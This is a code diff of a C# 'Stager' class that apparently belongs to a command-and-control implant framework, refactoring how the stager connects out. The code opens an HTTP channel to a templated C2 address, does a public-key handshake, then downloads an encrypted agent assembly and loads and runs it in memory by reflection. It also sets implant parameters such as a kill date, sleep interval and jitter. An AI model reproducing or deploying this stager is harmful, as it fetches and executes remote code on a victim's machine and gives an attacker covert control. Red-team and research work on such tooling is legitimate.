@@ -9,18 +9,12 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Reflection;
 using System.Text;
-using System.Threading;
 
 namespace Stager
 {
     public class Stager
     {
         static string AgentID;
-        static DateTime KillDate = DateTime.UtcNow.AddDays(100);
-        static string ConnectAddress = "127.0.0.1";
-        static int ConnectPort = 8080;
-        static int SleepInterval = 1;
-        static int SleepJitter = 10;
 
         static Crypto Crypto;
         static CommModule CommModule;
@@ -68,8 +62,10 @@ namespace Stager
                 }
             };
 
-            LoadCommModule();
-            Thread.Sleep(60000);
+
+            CommModule = new HTTPCommModule(AgentID, ConnectAddress, ConnectPort);
+            CommModule.Start();
+
             SendStage0();
 
             while (!Staged)
@@ -91,7 +87,6 @@ namespace Stager
                     }
                     else
                     {
-                        c2Data = null;
                         c2Data = Utilities.DecryptData<C2Data>(Message.Data, SessionKey, Message.IV);
                     }
 
@@ -104,25 +99,22 @@ namespace Stager
             }
         }
 
-        static void LoadCommModule()
+        static void SendStage0()
         {
-            StartHTTPCommModule();
-        }
+            var c2Data = Utilities.SerialiseData(
+                new C2Data
+                {
+                    Module = "Core",
+                    Command = "Stage0Request",
+                    Data = Encoding.UTF8.GetBytes(Crypto.PublicKey)
+                });
 
-        static void StartHTTPCommModule()
-        {
-            CommModule = new HTTPCommModule(AgentID, ConnectAddress, ConnectPort);
-            CommModule.Start();
-        }
-
-        static void StartTCPCommModule()
-        {
-
-        }
-
-        static void StartSMBCommModule()
-        {
-
+            CommModule.SendData(
+                new AgentMessage
+                {
+                    AgentID = AgentID,
+                    Data = c2Data
+                });
         }
 
         static void Stage0Response(C2Data C2Data)
@@ -173,8 +165,8 @@ namespace Stager
             CommModule.Stop();
             Staged = true;
 
-            // Load agent assembly
             var asm = Assembly.Load(C2Data.Data);
+
             asm.GetType("Agent.Stage").GetMethod("HTTPEntry").Invoke(null, new object[]
             {
                 AgentID,
@@ -187,22 +179,29 @@ namespace Stager
             });
         }
 
-        static void SendStage0()
+        static string ConnectAddress
         {
-            var c2Data = Utilities.SerialiseData(
-                new C2Data
-                {
-                    Module = "Core",
-                    Command = "Stage0Request",
-                    Data = Encoding.UTF8.GetBytes(Crypto.PublicKey)
-                });
+            get { return "<<ConnectAddress>>"; }
+        }
 
-            CommModule.SendData(
-                new AgentMessage
-                {
-                    AgentID = AgentID,
-                    Data = c2Data
-                });
+        static int ConnectPort
+        {
+            get { return 8080; }
+        }
+
+        static int SleepInterval
+        {
+            get { return 5; }
+        }
+
+        static int SleepJitter
+        {
+            get { return 25; }
+        }
+
+        static DateTime KillDate
+        {
+            get { return DateTime.Parse("<<KillDate>>"); }
         }
     }
 }
